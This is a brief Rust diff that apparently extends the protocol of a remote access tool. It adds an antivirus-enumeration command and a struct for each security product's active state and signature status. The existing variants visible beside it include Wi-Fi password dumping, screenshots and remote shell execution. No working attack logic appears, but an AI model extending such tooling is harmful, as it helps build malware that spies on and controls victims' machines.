@@ -19,6 +19,7 @@ pub enum ClientMessage {
     SystemInformation(SystemInformation),
     WifiDump(Vec<WifiPasswords>),
     Screenshot(String),
+    AntiVirus(Vec<AntiVirus>),
 
     // File system
     FileHandler(FileHeader),
@@ -40,6 +41,7 @@ pub enum InstructMessage {
     Check,
     Display(Display),
     Screenshot,
+    AntiVirus,
 
     // Shell
     Exec(String),
@@ -50,6 +52,15 @@ pub enum InstructMessage {
     Upload,
 
     Close,
+}
+
+#[derive(Serialize, Deserialize)]
+pub struct AntiVirus {
+    pub name: String,
+    pub active: bool,
+    pub is_default: bool,
+    pub state: String,
+    pub signatures_up_to_date: bool,
 }
 
 #[derive(Serialize, Deserialize)]
